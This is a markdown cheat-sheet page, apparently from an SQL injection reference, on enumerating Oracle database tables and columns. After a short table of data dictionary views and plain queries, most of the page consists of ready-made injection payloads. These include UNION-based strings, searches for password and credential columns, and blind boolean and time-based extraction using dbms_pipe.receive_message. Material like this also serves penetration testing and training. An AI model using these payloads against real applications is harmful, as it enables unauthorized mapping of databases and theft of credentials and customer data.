---
title: Tables and Columns
description: Methods to enumerate database tables and columns in Oracle
category: Information Gathering
order: 7
tags: ["tables", "columns", "schema", "enumeration"]
lastUpdated: 2025-03-15
---

## Tables and Columns

Enumerating tables and columns is a critical step in Oracle SQL injection attacks. Oracle stores metadata about all database objects in the data dictionary, a set of tables and views that contain information about the database structure.

### Data Dictionary Views

Oracle provides several data dictionary views to query database structure:

| View               | Description                       | Information Provided                              |
| ------------------ | --------------------------------- | ------------------------------------------------- |
| `ALL_TABLES`       | Tables accessible to current user | Table names, owners, tablespaces                  |
| `ALL_TAB_COLUMNS`  | Columns in accessible tables      | Column names, data types, sizes                   |
| `USER_TABLES`      | Tables owned by current user      | Table names, storage, statistics                  |
| `USER_TAB_COLUMNS` | Columns in user's tables          | Column details for owned tables                   |
| `DBA_TABLES`       | All tables in the database        | Complete table information (requires privileges)  |
| `DBA_TAB_COLUMNS`  | All columns in the database       | Complete column information (requires privileges) |
| `ALL_OBJECTS`      | All objects accessible to user    | Objects by type (TABLE, VIEW, etc.)               |

### Basic Table Enumeration

```sql
-- List all tables accessible to current user
SELECT TABLE_NAME FROM ALL_TABLES

-- List tables owned by current user
SELECT TABLE_NAME FROM USER_TABLES

-- List tables with owner information
SELECT OWNER, TABLE_NAME FROM ALL_TABLES

-- List tables in specific schema
SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='SYSTEM'

-- Count tables by schema
SELECT OWNER, COUNT(*) FROM ALL_TABLES GROUP BY OWNER
```

### Column Enumeration

```sql
-- List columns for a specific table
SELECT COLUMN_NAME, DATA_TYPE, DATA_LENGTH FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'

-- List all columns containing 'PASS' in the name
SELECT TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%PASS%'

-- List all columns containing 'USER' in the name
SELECT TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%USER%'

-- List first 10 columns from a table
SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='EMPLOYEES' AND ROWNUM <= 10
```

### SQL Injection Examples

#### UNION-Based Enumeration

```sql
-- Enumerate table names
' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES--

-- Enumerate schema names
' UNION SELECT DISTINCT OWNER,NULL FROM ALL_TABLES--

-- Enumerate columns for specific table
' UNION SELECT COLUMN_NAME,DATA_TYPE FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'--
```

#### Finding Sensitive Tables

```sql
-- Tables likely containing user data
' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES WHERE TABLE_NAME LIKE '%USER%' OR TABLE_NAME LIKE '%ACCOUNT%' OR TABLE_NAME LIKE '%MEMBER%'--

-- Tables likely containing password data
' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES WHERE TABLE_NAME LIKE '%PASS%' OR TABLE_NAME LIKE '%CRED%' OR TABLE_NAME LIKE '%AUTH%'--
```

#### Finding Sensitive Columns

```sql
-- Columns likely containing password data
' UNION SELECT TABLE_NAME||'.'||COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%PASS%' OR COLUMN_NAME LIKE '%PWD%'--

-- Columns likely containing username data
' UNION SELECT TABLE_NAME||'.'||COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%USER%' OR COLUMN_NAME LIKE '%NAME%'--
```

### Advanced Techniques

#### Using ROWNUM for Pagination

In Oracle, ROWNUM is used for pagination, which is useful when dealing with large result sets:

```sql
-- Get first 10 tables
' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES WHERE ROWNUM <= 10--

-- Get tables 11-20
' UNION SELECT TABLE_NAME,NULL FROM (SELECT TABLE_NAME, ROWNUM AS rn FROM ALL_TABLES) WHERE rn BETWEEN 11 AND 20--
```

#### Subquery Factoring (WITH Clause)

```sql
-- Find tables with interesting column combinations
' UNION SELECT t.table_name, c.column_name FROM ALL_TABLES t JOIN ALL_TAB_COLUMNS c ON t.table_name=c.table_name WHERE c.column_name LIKE '%PASS%'--
```

#### Using Data Dictionary Cache

```sql
-- Query the data dictionary cache
' UNION SELECT NAME,NAMESPACE FROM v$db_object_cache WHERE TYPE='TABLE'--
```

### Blind Enumeration

For blind SQL injection, character-by-character extraction:

```sql
-- Check if first character of first table name is 'A'
' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM=1),1,1))=65--
```

For time-based blind:

```sql
-- Add delay if first character of table name is 'A'
' AND (CASE WHEN ASCII(SUBSTR((SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM=1),1,1))=65 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
```

### Counting Objects

```sql
-- Count tables in each schema
' UNION SELECT OWNER||': '||COUNT(*),NULL FROM ALL_TABLES GROUP BY OWNER--

-- Count columns in specific table
' UNION SELECT 'Columns in USERS: '||COUNT(*),NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'--
```

### Finding Data Types

```sql
-- Get distribution of column data types
' UNION SELECT DATA_TYPE||': '||COUNT(*),NULL FROM ALL_TAB_COLUMNS GROUP BY DATA_TYPE--

-- Find LOB columns (potential for storing large data)
' UNION SELECT TABLE_NAME||'.'||COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE DATA_TYPE IN ('BLOB','CLOB')--
```

### System Tables of Interest

```sql
-- Check for existence of common sensitive tables
' UNION SELECT 'Found '||TABLE_NAME,NULL FROM ALL_TABLES WHERE TABLE_NAME IN ('USERS','EMPLOYEES','CUSTOMERS','ACCOUNTS','PAYMENTS')--
```
